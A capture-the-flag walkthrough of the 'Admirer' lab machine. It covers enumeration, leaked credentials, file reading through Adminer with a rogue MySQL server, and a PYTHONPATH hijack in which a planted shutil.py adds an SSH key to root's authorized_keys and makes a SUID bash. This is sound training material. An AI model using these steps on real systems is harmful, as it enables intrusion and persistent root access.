# Admirer

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (4046).png" alt=""><figcaption></figcaption></figure>

An Nmap vuln scan reveals there is a `robots.txt` file on port 80.

<figure><img src="../../../.gitbook/assets/image (2243).png" alt=""><figcaption></figcaption></figure>

We can head to that directly.

### FTP Credentials

The robots.txt file gave us the `/admin-dir` directory.

<figure><img src="../../../.gitbook/assets/image (2397).png" alt=""><figcaption></figcaption></figure>

However, visiting it gives us a 403.

<figure><img src="../../../.gitbook/assets/image (2116).png" alt=""><figcaption></figcaption></figure>

I used `gobuster` on this directory and found a `credentials.txt` file.

<figure><img src="../../../.gitbook/assets/image (1739).png" alt=""><figcaption></figcaption></figure>

We can view this file to find some FTP credentials.

<figure><img src="../../../.gitbook/assets/image (829).png" alt=""><figcaption></figcaption></figure>

Then, we can login to FTP.

### HTML Dump File

Within FTP, we can find a backup of the website.

<figure><img src="../../../.gitbook/assets/image (251).png" alt=""><figcaption></figcaption></figure>

When we extract this file and unzip it, we would be able to find a few directories of use.

<figure><img src="../../../.gitbook/assets/image (1011).png" alt=""><figcaption></figcaption></figure>

There are 2 directories, the `utility-scripts` and `w4ld0s` stuff. The secret directory revealed one more credential.

<figure><img src="../../../.gitbook/assets/image (2552).png" alt=""><figcaption></figcaption></figure>

The utility-scripts folder revealed some database credentials.

<figure><img src="../../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>

The `index.php` folder also revealed some credentials.

<figure><img src="../../../.gitbook/assets/image (761).png" alt=""><figcaption></figcaption></figure>

Afterwards, I was stumped here because I did not find any place to work on this. I understood that there was some kind of admirer-sounding application running somewhere, but gobuster was revealing nothing. Then, googling loads led me to the Adminer software, which was accessible on this website at `adminer.php`.

### Utility-Scripts/adminer.php

So far, none of the credentials work with FTP or SSH. The next logical step is to take a look at this directory to find an Adminer instance at `/utility-scripts/adminer.php`.

<figure><img src="../../../.gitbook/assets/image (1898).png" alt=""><figcaption></figcaption></figure>

Adminer is a tool for managing MySQL databases within the machine. There is one specific LFI that can be exploited here:

{% embed url="https://infosecwriteups.com/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f" %}

This requires us to start a local MySQL server, which can be done using this: (alternatively, run `mysql` on the attacking system)

{% embed url="https://raw.githubusercontent.com/Gifts/Rogue-MySql-Server/master/rogue_mysql_server.py" %}

After setting up the SQL server, we can change the IP address to the host's within our `/etc/mysql/mariadb.conf.d/50-server.cnf` file. Then, we need to execute these commands:

```
MariaDB [(none)]> CREATE DATABASE test;
Query OK, 1 row affected (0.003 sec)
MariaDB [(none)]> use test
Database changed
MariaDB [pwn]> CREATE TABLE file (data VARCHAR(256));
Query OK, 0 rows affected (0.008 sec)
```

This would create a new database for our LFI contents to go to. Within Adminer, we can login with OUR own root user credentials. Within the database, we would want to execute these queries to load files. I tried reading the `/etc/passwd` file but it didn't work (for some reason).

It seems that we aren't given permission to load certain files. Going back to the backup folder we retrieved, we can attempt to read the `/var/www/html` files based on the FTP backup we retrieved earlier.&#x20;

We can find a credential within the `/var/www/html/index.php` folder, which has been updated to `&<h5b~yK3F#{PaPB&dA}{H>` instead of the previous one we found.&#x20;

This credential works with SSH as waldo.

## Privilege Escalation

### SETENV

It seems that we have permission to set the environment variables for this script.

<figure><img src="../../../.gitbook/assets/image (2434).png" alt=""><figcaption></figcaption></figure>

This was the script:

```bash
#!/bin/bash
view_uptime()
{
    /usr/bin/uptime -p
}
view_users()
{
    /usr/bin/w
}
view_crontab()
{
    /usr/bin/crontab -l
}
backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;

        *) echo "Unknown option." >&2
    esac

    exit 0
fi
# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;

        *) echo "Unknown option." >&2
    esac
done

exit 0
```

Of all the functions within this, option 6, which is the `backup_web()` one looked the most vulnerable:

```bash
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```

It was the only one that wasn't running a stock binary from Linux. The backup script was as follows:

```python
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```

Whenever Python imports a module, it checks the PYTHONPATH variable for the directories to import it from, kind of like regular PATH. The SETENV privilege would let us change this variable to anything we want.

So to exploit this, we would simply need to change the PYTHONPATH variable to make the script import a malicious script that we have created. Because the module checks for `shutil`, we would need to name our malicious script `shutil.py` with a function `make_archive()` that takes 3 parameters but does nothing.

Afterwards, we need to find a directory that works. For some reason, the `/home/waldo` and `/tmp` directories were consistenly being cleared in this machine. As such, I used the `/var/tmp` directory, which seemed to be alright.

A quick Python script to echo our public key into the authorized\_key folder AND create a SUID binary should work:

{% code overflow="wrap" %}
```python
#!/usr/bin/python3

import os
# fake function to make import successful
def make_archive(a,b,c):
    pass

os.system("mkdir -p /root/.ssh; echo '<KEY>' >> /root/.ssh/authorized_keys")
os.system('cp /bin/bash /var/tmp/.user; chown root:root /var/tmp/.user; chmod 4755 /var/tmp/.user')
```
{% endcode %}

Afterwards, we can change the PYTHONPATH used for the script.

<figure><img src="../../../.gitbook/assets/image (1603).png" alt=""><figcaption></figcaption></figure>

Then, we can SSH in as root using the key we have.

<figure><img src="../../../.gitbook/assets/image (3723).png" alt=""><figcaption></figcaption></figure>
